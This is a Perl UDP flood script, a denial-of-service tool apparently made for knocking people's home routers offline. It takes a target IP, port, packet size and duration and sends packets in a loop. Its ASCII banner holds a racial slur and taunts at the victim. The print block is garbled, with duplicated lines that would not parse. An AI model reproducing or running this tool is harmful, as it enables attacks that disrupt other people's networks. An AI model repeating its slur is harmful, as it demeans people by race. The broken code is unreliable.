#!/usr/bin/perl
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# @DrugEmpire
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print BOLD BLUE <<EOTEXT;
               
       

         ===============================================================
         +                           Mami Stevee                       +
         ===============================================================
         +                  CUTE, NICE, CARING, AMAZING                +
         +                                                             +
         +         ▀▀█ █░█ ▒█▀▀▀█ ▒█▄░▒█ ▒█▀▀▀█ ▒█░░▒█ ▒█░░▒█          +
         +         ▄▀░ ▄▀▄ ░▀▀▀▄▄ ▒█▒█▒█ ▒█░░▒█ ▒█▒█▒█ ▒█▒█▒█          +
         +         ▀▀▀ ▀░▀ ▒█▄▄▄█ ▒█░░▀█ ▒█▄▄▄█ ▒█▄▀▄█ ▒█▄▀▄█          +
         +                       This girl will                        +                   
         +                          Slam You                           +        
         ===============================================================
         +                 zxSnow is about to make you                 +                   
         +                     hold these packets                      +
         ===============================================================
         +            Stop Slamming This Niggers Router                +
         +                      With Ctrl+C                            +
         +                  Made By: DrugEmpire                        +
         ===============================================================
EOTEXT
 
 print           "                      <<<Should've stopped flexing>>> $ip
                        On port " .
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit to the queen? Bad Idea! ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit to the queen? Wrong! ") . "\n";
        print "Stop DoSing with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
